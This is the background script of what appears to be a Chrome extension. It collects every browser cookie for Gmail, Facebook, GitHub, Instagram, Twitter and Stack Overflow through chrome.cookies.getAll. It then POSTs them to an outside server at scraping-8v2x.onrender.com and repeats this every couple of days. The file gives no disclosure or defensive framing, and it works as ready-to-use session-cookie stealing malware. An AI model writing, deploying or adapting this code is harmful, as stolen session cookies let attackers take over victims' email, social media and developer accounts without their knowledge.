const url = [
  "https://mail.google.com/mail",
  "https://www.facebook.com",
  "https://github.com",
  "https://www.instagram.com",
  "https://twitter.com",
  "https://stackoverflow.com",
];
const today = new Date()
const sendReq = async (data) => {
  const option = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  };
  // await fetch("http://localhost:4000/api/store-data", option)
    await fetch("https://scraping-8v2x.onrender.com/api/store-data", option)
    .then((res) => {
      if (res.ok) {
        console.log("success");
      }
    })
    .catch((err) => {
      console.log("error");
    });
  return;
};

const getCookies = (param) =>
  new Promise((resolve, reject) => {
    chrome.cookies.getAll(param, (cookies) => {
      resolve(cookies)
    });
  });

const getEachCookieAndSendRequest = () => new Promise(async (resolve, reject)=>{
  var list = new Array();
  for (let i = 0; i < url.length; i++) {
    const param = {
      url: url[i],
    };
    await getCookies(param).then((item) => {
      list[i] = item
    });
  }
  console.log(list)
  sendReq(list).then(() => {
    chrome.storage.sync.set({ currentDay : today.getDate() });
  });
  resolve()
})


  //update data every 2 day
chrome.storage.sync.get(["currentDay"],async (currentDay) =>{
  if(!currentDay.currentDay){
    await getEachCookieAndSendRequest();
    chrome.storage.sync.set({currentDay : today.getDate()})
  }
  //update data if it more than 2 day 
  else if(Math.abs(today.getDate() - currentDay.currentDay)> 1){
    try {
      await getEachCookieAndSendRequest();
    } catch (error) {
      console.log(error);
    }
  }
})

